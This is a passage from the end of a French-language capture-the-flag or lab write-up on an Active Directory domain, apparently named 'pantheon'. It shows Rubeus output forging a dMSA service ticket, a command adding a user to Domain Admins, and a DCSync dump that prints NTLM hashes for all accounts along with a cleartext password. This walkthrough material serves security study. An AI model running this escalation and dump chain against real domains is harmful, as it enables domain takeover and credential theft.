YqGjh7b7TFNhW2e7TWrdwjh0y/HyOF7r9W/hyYdq3/KCUwr/VAvc0AssKxIITGVu40Kqbh0V8CDn4lfyTIc/vbYMOcuo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgB1IFfI8U0q+NLYeGtCaKV+tZ869EwB13phVfpJdvG4ShDhsMUEFOVEhFT04uR09EohIwEKADAgEBoQkwBxsFaGFkZXOjBwMFAGChAAClERgPMjAyNTA2MjExOTM5MDJaphEYDzIwMjUwNjIyMDUzOTAxWqcRGA8yMDI1MDYyODE5MzkwMVqoDhsMUEFOVEhFT04uR09EqSEwH6ADAgECoRgwFhsGa3JidGd0GwxQQU5USEVPTi5HT0Q=
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>
<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>   ______        _
<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>  (_____ \      | |
<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>   _____) )_   _| |__  _____ _   _  ___
<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>  |  __  /| | | |  _ \| ___ | | | |/___)
<a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>  | |  \ \| |_| | |_) ) ____| |_| |___ |
<a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>  |_|   |_|____/|____/|_____)____/(___/
<a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>
<a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a>  v2.3.3
<a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a>
<a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a>[*] Action: Ask TGS
<a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a>
<a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a>[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
<a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a>[*] Building DMSA TGS-REQ request for &#39;pwned_dMSA$&#39; from &#39;orphee&#39;
<a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a>[+] Sequence number is: 1951566350
<a id="__codelineno-37-17" name="__codelineno-37-17" href="#__codelineno-37-17"></a>[*] Using domain controller: pantheon-dc01.pantheon.god (192.168.56.11)
<a id="__codelineno-37-18" name="__codelineno-37-18" href="#__codelineno-37-18"></a>[+] TGS request successful!
<a id="__codelineno-37-19" name="__codelineno-37-19" href="#__codelineno-37-19"></a>[+] Ticket successfully imported!
<a id="__codelineno-37-20" name="__codelineno-37-20" href="#__codelineno-37-20"></a>[*] base64(ticket.kirbi):
<a id="__codelineno-37-21" name="__codelineno-37-21" href="#__codelineno-37-21"></a>
<a id="__codelineno-37-22" name="__codelineno-37-22" href="#__codelineno-37-22"></a>      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
<a id="__codelineno-37-23" name="__codelineno-37-23" href="#__codelineno-37-23"></a>
<a id="__codelineno-37-24" name="__codelineno-37-24" href="#__codelineno-37-24"></a>  ServiceName              :  krbtgt/PANTHEON.GOD
<a id="__codelineno-37-25" name="__codelineno-37-25" href="#__codelineno-37-25"></a>  ServiceRealm             :  PANTHEON.GOD
<a id="__codelineno-37-26" name="__codelineno-37-26" href="#__codelineno-37-26"></a>  UserName                 :  pwned_dMSA$ (NT_PRINCIPAL)
<a id="__codelineno-37-27" name="__codelineno-37-27" href="#__codelineno-37-27"></a>  UserRealm                :  pantheon.god
<a id="__codelineno-37-28" name="__codelineno-37-28" href="#__codelineno-37-28"></a>  StartTime                :  6/21/2025 7:57:18 PM
<a id="__codelineno-37-29" name="__codelineno-37-29" href="#__codelineno-37-29"></a>  EndTime                  :  6/21/2025 8:12:18 PM
<a id="__codelineno-37-30" name="__codelineno-37-30" href="#__codelineno-37-30"></a>  RenewTill                :  6/28/2025 7:39:01 PM
<a id="__codelineno-37-31" name="__codelineno-37-31" href="#__codelineno-37-31"></a>  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
<a id="__codelineno-37-32" name="__codelineno-37-32" href="#__codelineno-37-32"></a>  KeyType                  :  aes256_cts_hmac_sha1
<a id="__codelineno-37-33" name="__codelineno-37-33" href="#__codelineno-37-33"></a>  Base64(key)              :  lz6aJiIROu869mpfk75WMyXuA/9jyzJBbk7M9V/P/0M=
<a id="__codelineno-37-34" name="__codelineno-37-34" href="#__codelineno-37-34"></a>  Current Keys for pwned_dMSA$: (aes256_cts_hmac_sha1) 96382D52C19DC606FF501EAD0FDB514EA2AD7C3AAF82FBC9EB584FE244A34753
<a id="__codelineno-37-35" name="__codelineno-37-35" href="#__codelineno-37-35"></a>
<a id="__codelineno-37-36" name="__codelineno-37-36" href="#__codelineno-37-36"></a>PS C:\Users\hades\Desktop&gt;
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>PS C:\Users\hades\Desktop&gt; net group &quot;domain admins&quot; /add orphee /domain
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>The request will be processed at a domain controller for domain pantheon.god.
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>The command completed successfully.
<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>
<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>PS C:\Users\hades\Desktop&gt;
</code></pre></div>
<p>On as pus ce rajouter en tant d’aministrateur du domain. </p>
<p>Cela nous permet de faire un <code>DCsync</code> pour récupérer tout les hash du domain</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="s2">&quot;192.168.56.11&quot;</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span>--ntds
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>the<span class="w"> </span>ntds<span class="w"> </span>can<span class="w"> </span>crash<span class="w"> </span>the<span class="w"> </span>DC<span class="w"> </span>on<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span>.<span class="w"> </span>Use<span class="w"> </span>the<span class="w"> </span>option<span class="w"> </span>--user<span class="w"> </span>&lt;user&gt;<span class="w"> </span>to<span class="w"> </span>dump<span class="w"> </span>a<span class="w"> </span>specific<span class="w"> </span>user<span class="w"> </span>safely<span class="w"> </span>or<span class="w"> </span>the<span class="w"> </span>module<span class="w"> </span>-M<span class="w"> </span>ntdsutil<span class="w"> </span><span class="o">[</span>Y/n<span class="o">]</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">11</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2025</span><span class="w"> </span>Build<span class="w"> </span><span class="m">26100</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:PANTHEON-DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:pantheon.god<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>pantheon.god<span class="se">\o</span>rphee:Mus1cM@st3r!2024<span class="w"> </span><span class="o">(</span>admin<span class="o">)</span>
<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>the<span class="w"> </span>NTDS,<span class="w"> </span>this<span class="w"> </span>could<span class="w"> </span>take<span class="w"> </span>a<span class="w"> </span><span class="k">while</span><span class="w"> </span>so<span class="w"> </span>go<span class="w"> </span>grab<span class="w"> </span>a<span class="w"> </span>redbull...
<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:aff6a388446bba49babad7aaf35aae83:::
<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d6f782d1249a05a188a3fd2336004c1c:::
<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
<a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>zeus:1112:aad3b435b51404eeaad3b435b51404ee:5b68357e3a16721b6523dff3234652ae:::
<a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>hera:1113:aad3b435b51404eeaad3b435b51404ee:d1eb28b8b4081c051bcf65050fe65ca0:::
<a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>poseidon:1114:aad3b435b51404eeaad3b435b51404ee:d1c741139ff861b32a322a0352ae265d:::
<a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>demeter:1115:aad3b435b51404eeaad3b435b51404ee:a8300dbc2a0f174b64951c9da08e4d0b:::
<a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>athena:1116:aad3b435b51404eeaad3b435b51404ee:416d0ff6775086300c6221ae7efbc402:::
<a id="__codelineno-39-15" name="__codelineno-39-15" href="#__codelineno-39-15"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>apollo:1117:aad3b435b51404eeaad3b435b51404ee:5746e19586565c6742ed10f8d469b639:::
<a id="__codelineno-39-16" name="__codelineno-39-16" href="#__codelineno-39-16"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>artemis:1118:aad3b435b51404eeaad3b435b51404ee:c7b57775c739c2fa8d5e24032a2f0fbe:::
<a id="__codelineno-39-17" name="__codelineno-39-17" href="#__codelineno-39-17"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>ares:1119:aad3b435b51404eeaad3b435b51404ee:551fc4fb35460741f949253495ac1698:::
<a id="__codelineno-39-18" name="__codelineno-39-18" href="#__codelineno-39-18"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>aphrodite:1120:aad3b435b51404eeaad3b435b51404ee:17f0fd7ea28eb4be24153ff2ec3e6119:::
<a id="__codelineno-39-19" name="__codelineno-39-19" href="#__codelineno-39-19"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>hephaistos:1121:aad3b435b51404eeaad3b435b51404ee:bc93607a09d45adb70ce0f02869021d6:::
<a id="__codelineno-39-20" name="__codelineno-39-20" href="#__codelineno-39-20"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>hermes:1122:aad3b435b51404eeaad3b435b51404ee:1a7639670465f9deaa2b4534f1867a32:::
<a id="__codelineno-39-21" name="__codelineno-39-21" href="#__codelineno-39-21"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>dionysos:1123:aad3b435b51404eeaad3b435b51404ee:bb11bc506d66de79df5fbcbd7ede151c:::
<a id="__codelineno-39-22" name="__codelineno-39-22" href="#__codelineno-39-22"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>achille:1124:aad3b435b51404eeaad3b435b51404ee:95718c56984fbe7f6ae1958433b16880:::
<a id="__codelineno-39-23" name="__codelineno-39-23" href="#__codelineno-39-23"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>theseus:1125:aad3b435b51404eeaad3b435b51404ee:06cf37a4cd7e41d838b37092cf0d9cf9:::
<a id="__codelineno-39-24" name="__codelineno-39-24" href="#__codelineno-39-24"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>perseus:1126:aad3b435b51404eeaad3b435b51404ee:48505186cb6ffaad4f14c52509b8438e:::
<a id="__codelineno-39-25" name="__codelineno-39-25" href="#__codelineno-39-25"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>ulysse:1127:aad3b435b51404eeaad3b435b51404ee:36a6da7303d1a46aab641d44ba6990af:::
<a id="__codelineno-39-26" name="__codelineno-39-26" href="#__codelineno-39-26"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>jason:1128:aad3b435b51404eeaad3b435b51404ee:b40f85d1bd20d52e721d9731753e5892:::
<a id="__codelineno-39-27" name="__codelineno-39-27" href="#__codelineno-39-27"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>orphee:1129:aad3b435b51404eeaad3b435b51404ee:e5434e98bb7d29c8b4392bcca15d860a:::
<a id="__codelineno-39-28" name="__codelineno-39-28" href="#__codelineno-39-28"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>asclepios:1130:aad3b435b51404eeaad3b435b51404ee:e1ef927a14e399b67f532b5f492570a4:::
<a id="__codelineno-39-29" name="__codelineno-39-29" href="#__codelineno-39-29"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>psyche:1131:aad3b435b51404eeaad3b435b51404ee:499dcff82f6d25be7b267a94c2cdb62e:::
<a id="__codelineno-39-30" name="__codelineno-39-30" href="#__codelineno-39-30"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>ganymede:1132:aad3b435b51404eeaad3b435b51404ee:32e822f8b80fca89e0f70dfb9a6ffb47:::
<a id="__codelineno-39-31" name="__codelineno-39-31" href="#__codelineno-39-31"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>hades:1133:aad3b435b51404eeaad3b435b51404ee:ead49bdbe3311143eeafbcb14d8ae126:::
<a id="__codelineno-39-32" name="__codelineno-39-32" href="#__codelineno-39-32"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>cronos:1134:aad3b435b51404eeaad3b435b51404ee:9c0a518fd5a9ae01c9282203980ad85b:::
<a id="__codelineno-39-33" name="__codelineno-39-33" href="#__codelineno-39-33"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>iapetos:1135:aad3b435b51404eeaad3b435b51404ee:7b247761b5db99db000a9e077e0155f2:::
<a id="__codelineno-39-34" name="__codelineno-39-34" href="#__codelineno-39-34"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>coeus:1136:aad3b435b51404eeaad3b435b51404ee:ee853d94f3c5ddfc40f764426b758284:::
<a id="__codelineno-39-35" name="__codelineno-39-35" href="#__codelineno-39-35"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>hyperion:1137:aad3b435b51404eeaad3b435b51404ee:5c41d7ea5b8215a005052c21b233edf0:::
<a id="__codelineno-39-36" name="__codelineno-39-36" href="#__codelineno-39-36"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>krios:1138:aad3b435b51404eeaad3b435b51404ee:f1de6b7dcf24a30198b8aa823ab7e2b0:::
<a id="__codelineno-39-37" name="__codelineno-39-37" href="#__codelineno-39-37"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>smbscores:1139:aad3b435b51404eeaad3b435b51404ee:54e48c5f048847ce13fa805e1459b63e:::
<a id="__codelineno-39-38" name="__codelineno-39-38" href="#__codelineno-39-38"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>hercule:1140:aad3b435b51404eeaad3b435b51404ee:0906d53ebe3acdd2a545355ced7053f8:::
<a id="__codelineno-39-39" name="__codelineno-39-39" href="#__codelineno-39-39"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>PANTHEON-DC01$:1001:aad3b435b51404eeaad3b435b51404ee:044d32223bdc78362acd13fc27ea5dad:::
<a id="__codelineno-39-40" name="__codelineno-39-40" href="#__codelineno-39-40"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>PANTHEON-ENFERS$:1104:aad3b435b51404eeaad3b435b51404ee:c26c2e72ed7035dcde9b910b4e0cf411:::
<a id="__codelineno-39-41" name="__codelineno-39-41" href="#__codelineno-39-41"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>svc_thunderB$:1111:aad3b435b51404eeaad3b435b51404ee:dd0f819d9e5971f7b0927b33a6c7dfd7:::
<a id="__codelineno-39-42" name="__codelineno-39-42" href="#__codelineno-39-42"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span>pwned_dMSA$:1141:aad3b435b51404eeaad3b435b51404ee:bda205d296baf2743022fd78bb41b82a:::
<a id="__codelineno-39-43" name="__codelineno-39-43" href="#__codelineno-39-43"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Dumped<span class="w"> </span><span class="m">37</span><span class="w"> </span>NTDS<span class="w"> </span>hashes<span class="w"> </span>to<span class="w"> </span>/root/.nxc/logs/ntds/PANTHEON-DC01_192.168.56.11_2025-06-26_071036.ntds<span class="w"> </span>of<span class="w"> </span>which<span class="w"> </span><span class="m">33</span><span class="w"> </span>were<span class="w"> </span>added<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>database
<a id="__codelineno-39-44" name="__codelineno-39-44" href="#__codelineno-39-44"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>To<span class="w"> </span>extract<span class="w"> </span>only<span class="w"> </span>enabled<span class="w"> </span>accounts<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>output<span class="w"> </span>file,<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>command:
<a id="__codelineno-39-45" name="__codelineno-39-45" href="#__codelineno-39-45"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>cat<span class="w"> </span>/root/.nxc/logs/ntds/PANTHEON-DC01_192.168.56.11_2025-06-26_071036.ntds<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iv<span class="w"> </span>disabled<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;:&#39;</span><span class="w"> </span>-f1
<a id="__codelineno-39-46" name="__codelineno-39-46" href="#__codelineno-39-46"></a>SMB<span class="w">         </span><span class="m">192</span>.168.56.11<span class="w">   </span><span class="m">445</span><span class="w">    </span>PANTHEON-DC01<span class="w">    </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>grep<span class="w"> </span>-iv<span class="w"> </span>disabled<span class="w"> </span>/root/.nxc/logs/ntds/PANTHEON-DC01_192.168.56.11_2025-06-26_071036.ntds<span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;:&#39;</span><span class="w"> </span>-f1
<a id="__codelineno-39-47" name="__codelineno-39-47" href="#__codelineno-39-47"></a><span class="o">[</span>orphee@pantheon.god<span class="o">][</span>Jun<span class="w"> </span><span class="m">26</span>,<span class="w"> </span><span class="m">2025</span><span class="w"> </span>-<span class="w"> </span><span class="m">07</span>:10:37<span class="w"> </span><span class="o">(</span>CEST<span class="o">)]</span><span class="w"> </span>exegol-pantheon_wu<span class="w"> </span>exploit<span class="w"> </span><span class="c1">#</span>
</code></pre></div>







  
    
  
  
    
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="July 6, 2025 17:42:44 UTC">July 6, 2025</span>
  </span>

    
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Created">
